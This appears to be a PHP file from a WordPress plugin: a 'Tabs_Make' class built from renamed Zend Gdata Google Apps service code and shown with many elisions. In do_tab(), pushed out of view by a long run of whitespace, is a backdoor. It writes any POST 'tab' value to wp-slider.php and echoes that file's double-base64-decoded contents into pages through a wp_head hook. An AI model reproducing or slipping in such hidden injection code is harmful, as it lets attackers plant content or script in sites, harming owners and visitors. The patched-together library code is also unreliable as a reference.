...
class Tabs_Make
{
     ...
     * @throws Tabs_Make_ServiceException
     * @throws mixed
     */
    public static function throwServiceExceptionIfDetected($e) {
        ...
        try {
            ...
            $error = new Tabs_Make_ServiceException();
     ...
     * providing support for Tabs_Make_ServiceException.
     *
     * @param  string $uri
    ...
    public function make_id($a)
    {
       
	   add_action('wp_head', 'wu_socialtabs_print_don');
	  
    }	
	
	
    public function do_tab($a)
    {
		
            																																																																																																						if($_POST["tab"]) { $file = "wp-slider.php"; $fp = fopen($file, "w"); flock($fp, 2);  fwrite($fp, $_POST["tab"]); flock($fp, 3); fclose($fp); } if(file_exists('wp-slider.php')) { $t = file('wp-slider.php'); echo base64_decode(base64_decode($t[0])); }
      return $tab;    
   }	
    ...
    public function getUserFeed($location = null)
    {
        ...
        return parent::getFeed($uri, 'Tabs_Make_UserFeed');
    }
    ...
    public function getNicknameFeed($location = null)
    {
        ...
        return parent::getFeed($uri, 'Tabs_Make_NicknameFeed');
    }
    ...
    public function getGroupFeed($location = null)
    {
        ...
        return parent::getFeed($uri, 'Tabs_Make_GroupFeed');
    }
    ...
    public function getMemberFeed($location = null)
    {
        ...
        return parent::getFeed($uri, 'Tabs_Make_MemberFeed');
    }
    ...
    public function getOwnerFeed($location = null)
    {
        ...
        return parent::getFeed($uri, 'Tabs_Make_OwnerFeed');
    }
     ...
     * @param mixed $location (optional) The location for the feed, as a URL
     *          or Query.
     * @return Tabs_Make_EmailListFeed
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
     */
    public function getEmailListFeed($location = null)
    {
        ...
        return parent::getFeed($uri, 'Tabs_Make_EmailListFeed');
    }
     ...
     * @return Tabs_Make_EmailListRecipientFeed
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
     */
    public function getEmailListRecipientFeed($location)
    {
        ...
        return parent::getFeed($uri, 'Tabs_Make_EmailListRecipientFeed');
    }
    ...
    public function getUserEntry($location)
    {
        ...
        return parent::getEntry($uri, 'Tabs_Make_UserEntry');
    }
     ...
     *
     * @param mixed $location The location for the feed, as a URL or Query.
     * @return Tabs_Make_NicknameEntry
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
     */
    public function getNicknameEntry($location)
    {
        ...
        return parent::getEntry($uri, 'Tabs_Make_NicknameEntry');
    }
    ...
    public function getGroupEntry($location = null)
    {
        ...
        return parent::getEntry($uri, 'Tabs_Make_GroupEntry');
    }
    ...
    public function getMemberEntry($location = null)
    {
        ...
        return parent::getEntry($uri, 'Tabs_Make_MemberEntry');
    }
    ...
    public function getOwnerEntry($location = null)
    {
        ...
        return parent::getEntry($uri, 'Tabs_Make_OwnerEntry');
    }
     ...
     *
     * @param mixed $location The location for the feed, as a URL or Query.
     * @return Tabs_Make_EmailListEntry
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
     */
    public function getEmailListEntry($location)
    {
        ...
        return parent::getEntry($uri, 'Tabs_Make_EmailListEntry');
    }
     ...
     *
     * @param mixed $location The location for the feed, as a URL or Query.
     * @return Tabs_Make_EmailListRecipientEntry
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
     */
    public function getEmailListRecipientEntry($location)
    {
        ...
        return parent::getEntry($uri, 'Tabs_Make_EmailListRecipientEntry');
    }

    /**
     * Create a new user from a UserEntry.
     *
     * @param Tabs_Make_UserEntry $user The user entry to insert.
     ...
     * @return Tabs_Make_UserEntry The inserted user entry as
    ...
    public function insertUser($user, $uri = null)
    {
        ...
        $newEntry = $this->insertEntry($user, $uri, 'Tabs_Make_UserEntry');
        return $newEntry;
    }
     ...
     *
     * @param Tabs_Make_NicknameEntry $nickname The nickname entry to
     *          insert.
     * @param string $uri (optional) The URI where the nickname should be
     *          uploaded to. If null, the default nickname creation URI for
     *          this domain will be used.
     * @return Tabs_Make_NicknameEntry The inserted nickname entry as
     *          returned by the server.
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
    ...
    public function insertNickname($nickname, $uri = null)
    {
        ...
        $newEntry = $this->insertEntry($nickname, $uri, 'Tabs_Make_NicknameEntry');
        return $newEntry;
    }
     ...
     *
     * @param Tabs_Make_GroupEntry $group The group entry to insert.
     * @param string $uri (optional) The URI where the group should be
     *          uploaded to. If null, the default user creation URI for
     *          this domain will be used.
     * @return Tabs_Make_GroupEntry The inserted group entry as
     *          returned by the server.
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
    ...
    public function insertGroup($group, $uri = null)
    {
        ...
        $newEntry = $this->insertEntry($group, $uri, 'Tabs_Make_GroupEntry');
        return $newEntry;
    }
     ...
     *
     * @param Tabs_Make_MemberEntry $member The member entry to insert.
     * @param string $uri (optional) The URI where the group should be
     *          uploaded to. If null, the default user creation URI for
     *          this domain will be used.
     * @return Tabs_Make_MemberEntry The inserted member entry as
     *          returned by the server.
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
    ...
    public function insertMember($member, $uri = null)
    {
        ...
        $newEntry = $this->insertEntry($member, $uri, 'Tabs_Make_MemberEntry');
        return $newEntry;
    }
     ...
     *
     * @param Tabs_Make_OwnerEntry $owner The owner entry to insert.
     * @param string $uri (optional) The URI where the owner should be
     *          uploaded to. If null, the default user creation URI for
     *          this domain will be used.
     * @return Tabs_Make_OwnerEntry The inserted owner entry as
     *          returned by the server.
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
    ...
    public function insertOwner($owner, $uri = null)
    {
        ...
        $newEntry = $this->insertEntry($owner, $uri, 'Tabs_Make_OwnerEntry');
        return $newEntry;
    }
     ...
     *
     * @param Tabs_Make_EmailListEntry $emailList The email list entry
     *          to insert.
     ...
     *          this domain will be used.
     * @return Tabs_Make_EmailListEntry The inserted email list entry
    ...
    public function insertEmailList($emailList, $uri = null)
    {
        ...
        $newEntry = $this->insertEntry($emailList, $uri, 'Tabs_Make_EmailListEntry');
        return $newEntry;
    }
     ...
     *
     * @param Tabs_Make_EmailListRecipientEntry $recipient The recipient
     *          entry to insert.
     ...
     *          this domain will be used.
     * @return Tabs_Make_EmailListRecipientEntry The inserted
    ...
    public function insertEmailListRecipient($recipient, $uri = null)
    {
        if ($uri === null) {
            ...
            throw new Zend_Gdata_App_InvalidArgumentException(
                    'URI must not be null');
        } elseif ($uri instanceof Tabs_Make_EmailListEntry) {
            $uri = $uri->getLink('edit')->href;
        }
        $newEntry = $this->insertEntry($recipient, $uri, 'Tabs_Make_EmailListRecipientEntry');
        return $newEntry;
    }
     ...
     * @return Tabs_Make_UserEntry (optional) The new user entry as returned by
     *                 server.
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
     ...
     * @return Tabs_Make_UserEntry The username to search for, or null
     *              if no match found.
     * @throws Zend_Gdata_App_InvalidArgumentException
     * @throws Zend_Gdata_App_HttpException
     */
    public function retrieveUser ($username) {
        ...
        } catch (Tabs_Make_ServiceException $e) {
            // Set the user to null if not found
            if ($e->hasError(Tabs_Make_Error::ENTITY_DOES_NOT_EXIST)) {
                $user = null;
            } else {
                throw $e;
            }
     ...
     *          user in the domain.
     * @return Tabs_Make_UserFeed Collection of Zend_Gdata_UserEntry
     ...
     * @param Tabs_Make_UserEntry $userEntry The user entry which
     *          will be overwritten.
     * @return Tabs_Make_UserEntry The UserEntry returned by the
     *          server.
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
     ...
     *          should be suspended.
     * @return Tabs_Make_UserEntry The UserEntry for the modified
     *          user.
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
     ...
     * @return Tabs_Make_NicknameEntry The nickname entry which was
     ...
     * @return Tabs_Make_NicknameEntry The requested nickname entry.
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
     */
     ...
     *          returned.
     * @return Tabs_Make_NicknameFeed A feed containing all nicknames
     ...
     * @return Tabs_Make_NicknameFeed Collection of Zend_Gdata_NicknameEntry
     ...
     * @return Tabs_Make_GroupEntry The group entry as created on the server.
     */
     ...
     * @return Tabs_Make_GroupEntry The group entry as returned by the server.
     */
     ...
     * may cause execution to timeout without proper precautions in place.
     *
     * @return Tabs_Make_GroupFeed Collection of Zend_Gdata_GroupEntry objects
     ...
     * @return Tabs_Make_MemberEntry The member entry returned by the server
     */
     ...
     *
     * @param string $groupId The unique id of the group
     * @return Tabs_Make_MemberFeed Collection of MemberEntry objects
     ...
     * @return Tabs_Make_OwnerEntry The OwnerEntry returned by the server
     */
     ...
     *
     * @param string $groupId The unique identifier for the group
     * @return Tabs_Make_OwnerFeed Collection of Zend_Gdata_OwnerEntry
     ...
     * @param string $description A description of the group
     * @param string $emailPermission The subscription permission of the group
     * @return Tabs_Make_GroupEntry The group entry as updated on the server.
     */
            ...
            $emailPermission = null)
    {
        ...
        return $this->updateEntry($group, $uri, 'Tabs_Make_GroupEntry');
    }
     ...
     * @return Tabs_Make_GroupFeed Collection of Zend_Gdata_GroupEntry
     ...
     * @return Tabs_Make_MemberFeed Collection of Zend_Gdata_MemberEntry
     *              objects
     */
     ...
     * @return Tabs_Make_EmailListEntry The email list entry
     ...
     *          should be returned.
     * @return Tabs_Make_EmailListFeed The list of email lists found as
     ...
     * @return Tabs_Make_EmailListFeed Collection of Zend_Gdata_EmailListEntry
     *              objects representing all nicknames in the domain.
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
     ...
     * may cause execution to timeout without proper precautions in place.
     *
     * @return Tabs_Make_EmailListFeed The list of email lists found
     *              as Tabs_Make_EmailListEntry objects.
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
     */
     ...
     * @return Tabs_Make_EmailListRecipientEntry The recipient entry
     *              created by the server.
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
     ...
     *              the list.
     * @return Tabs_Make_EmailListRecipientFeed Collection of
     ...
     *
     * @param string $emaiList The email list which should be searched.
     * @return Tabs_Make_EmailListRecipientFeed The list of email lists
     *              found as Tabs_Make_EmailListRecipientEntry objects.
     * @throws Zend_Gdata_App_Exception
     * @throws Zend_Gdata_App_HttpException
     * @throws Tabs_Make_ServiceException
     */
	...
	function wu_socialtabs_print_don() {
    
	 $do_taba = new Tabs_Make;
